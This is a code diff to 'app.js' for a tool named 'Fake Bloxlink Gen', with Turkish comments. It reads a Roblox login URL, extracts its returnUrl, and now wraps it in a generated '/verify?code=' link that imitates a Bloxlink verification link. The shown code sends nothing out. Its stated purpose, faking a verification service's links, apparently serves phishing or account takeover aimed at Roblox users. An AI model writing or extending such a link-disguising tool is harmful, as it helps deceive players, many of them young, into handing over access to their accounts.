@@ -1,4 +1,4 @@
-// app.js - Fake Bloxlink Gen (Aynı)
+// app.js - Fake Bloxlink Gen
 document.addEventListener('DOMContentLoaded', function() {
     const loginUrlInput = document.getElementById('loginUrl');
     const convertBtn = document.getElementById('convertBtn');
@@ -8,7 +8,7 @@ document.addEventListener('DOMContentLoaded', function() {
     const errorText = document.getElementById('errorText');
     const domainsList = document.getElementById('domainsList');
 
-    // Desteklenen domainler (örnek)
+    // Desteklenen domainler
     const supportedDomains = [
         'roblox.com', 'roblox.com.ge', 'roblox.jp', 'roblox.kr', 'roblox.es',
         'roblox.fr', 'roblox.de', 'roblox.it', 'roblox.pt', 'roblox.br',
@@ -20,6 +20,11 @@ document.addEventListener('DOMContentLoaded', function() {
     ];
 
     domainsList.textContent = supportedDomains.join(', ');
+
+    // Rastgele 16 haneli sayısal kod üret
+    function generateRandomCode() {
+        return Math.floor(1000000000000000 + Math.random() * 9000000000000000).toString();
+    }
 
     function processUrl(url) {
         try {
@@ -35,8 +40,18 @@ document.addEventListener('DOMContentLoaded', function() {
                 errorText.textContent = '❌ No returnUrl parameter found!';
                 return null;
             }
+
+            // Rastgele kod oluştur
+            const code = generateRandomCode();
+
+            // returnUrl'yi localStorage'a kod ile kaydet
+            localStorage.setItem('bloxlink_redirect_' + code, returnUrl);
+
+            // Oluşturulan link
+            const generatedLink = window.location.origin + '/verify?code=' + code;
+
             errorText.textContent = '';
-            return returnUrl;
+            return generatedLink;
         } catch (e) {
             errorText.textContent = '❌ Invalid URL!';
             return null;
@@ -55,7 +70,6 @@ document.addEventListener('DOMContentLoaded', function() {
             resultUrl.textContent = result;
             resultSection.classList.remove('hidden');
             resultSection.classList.add('show');
-            localStorage.setItem('bloxlink_verify_link', result);
         } else {
             resultSection.classList.add('hidden');
         }
